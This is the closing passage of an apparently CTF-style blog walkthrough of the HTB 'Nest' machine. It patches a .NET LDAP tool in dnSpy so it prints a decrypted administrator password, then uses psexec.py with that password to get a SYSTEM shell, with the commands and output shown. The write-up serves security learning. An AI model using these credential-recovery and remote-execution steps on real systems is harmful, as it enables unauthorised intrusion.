<p>Took me a minute to understand the commands, so basically</p>
<ul>
<li>LIST is to list directory,</li>
<li>SHOWQUERY is to show file content,</li>
<li>RUNQUERY is to execute.</li>
<li>SETDIR is change directory.</li>
</ul>
<p>Looking up into the LDAP directory, there&rsquo;s <code>ldap.conf</code> that contains administrator credentials with another encrypted password.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*0FINadW8yhptF6wzvidgsw.png" alt="img"  /></div>
</p>
<p>I have a copy of <code>HqkLdap.exe</code> on <code>c.smith</code>&rsquo;s loot directory. So I decided to copy HqkLdap.exe from Kali to Windows and inspect the binary.I also created a copy of <code>Ldap.conf</code>.</p>
<h4 id="reversing-hqkldapexe">Reversing HQKLdap.exe</h4>
<p>Running <code>strings</code> <code>HqkLdap.exe</code> againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.</p>
<p><img src="imgs/image-20210416085451866.png" alt="image-20210416085451866" style="zoom:80%;" /></p>
<p>Using immunity/ollydbg is waste of time because I can’t really read assembly, instead I have a very useful tool for reversing and debugging .NET applications called <code>dnSpy</code>. It&rsquo;s free on Github.</p>
<ul>
<li>dnSpy: <a href="https://github.com/0xd4d/dnSpy/releases">https://github.com/0xd4d/dnSpy/releases</a></li>
</ul>
<p>For this I&rsquo;ll go straight to the application main function.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*W6q1GITk1OTtrEmoVEX98A.png" alt="img"  /></div>
</p>
<p>To run this program properly, a config file, which is <code>ldap.conf</code>, must be served as an argument to the application, and it also needs the presences of <code>HqkDbImport.exe</code> (These two must exist in the same folder)</p>
<p><img src="imgs/image-20210416091107297.png" alt="image-20210416091107297" style="zoom:80%;" /></p>
<p>So if I run it and I don&rsquo;t fulfill the check, it will complain like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\fahmi\Desktop&gt;.\HqkLdap.exe Ldap.conf
Please ensure the optional database import module is installed
</code></pre></div><p>Next, I investigated the decrypt function, which was called on the main after the checks were completed.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DoxZojo9U_5FVmtJBydPsg.png" alt="img"  /></div>
</p>
<p>On the next block, I see <code>ldapSearchSettings.Password</code> is assigned to <code>ldap.password</code></p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*B-sjrlUthEkQ0d6o855QMw.png" alt="img"  /></div>
</p>
<p>From here, what I can try is:</p>
<ul>
<li>Remove the part of codes that used to check for the existence of <code>HqkDbImport.exe</code></li>
<li>Add another line to print out the password from <code>ldap.Password</code>.</li>
</ul>
<p>I&rsquo;ll use the edit feature to edit the main class.</p>
<p><img src="imgs/image-20210416093818613.png" alt="image-20210416093818613" style="zoom:80%;" /></p>
<p>Also, I’ll get rid the line that used to check the existence of <code>HqkDbImport.exe</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main()
{
  <span style="color:#66d9ef">checked</span>
  { 
    <span style="color:#66d9ef">try</span>
    {
      <span style="color:#66d9ef">if</span> (MyProject.Application.CommandLineArgs.Count != <span style="color:#ae81ff">1</span>) 
      {
        Console.WriteLine(<span style="color:#e6db74">&#34;Invalid number of command line arguments&#34;</span>);
      }
      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (!File.Exists(MyProject.Application.CommandLineArgs[<span style="color:#ae81ff">0</span>]))
      {
        Console.WriteLine(<span style="color:#e6db74">&#34;Specified config file does not exist&#34;</span>);
      }
      <span style="color:#66d9ef">else</span> {
...&lt;snip&gt; ...
</code></pre></div><p>Then I’ll add a new line code on the main function at line 56 to print <code>ldap.Password</code> to the console.</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*FvxtmqQKLEbY9tECtvRTtw.png" alt="img"  /></div>
</p>
<p>I tried to compile it back but then there was an error about the unassigned local variable &lsquo;enumerator&rsquo;, so I deleted that variable and tried to compile it back.</p>
<p><div class="img-container"><img src="imgs/image-20210416094537134.png" alt="image-20210416094537134"  /></div>
</p>
<p>It succeeded and I can export the modified program.</p>
<p>Now I can just run it and provide the <strong>ldap.conf</strong> as its argument and it works!</p>
<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*DWT9GjrNNCYs_YpYY1B8Ug.png" alt="img"  /></div>
</p>
<p>The password is: <code>XtH4nkS4Pl4y1nGX</code></p>
<h4 id="pass-the-hash-with-psexecpy">Pass the Hash with psexec.py</h4>
<p>I can gain access as local system on the box using administrator account and the decrypted password with <code>psexec.py</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «c.smith» «192.168.43.234»
$ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
Impacket v0.9.20 - Copyright <span style="color:#ae81ff">2019</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.178.....
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file nQyIIpWk.exe
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.178.....
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service gfCe on 10.10.10.178.....
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service gfCe.....
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
nt authority<span style="color:#ae81ff">\s</span>ystem
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux">https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
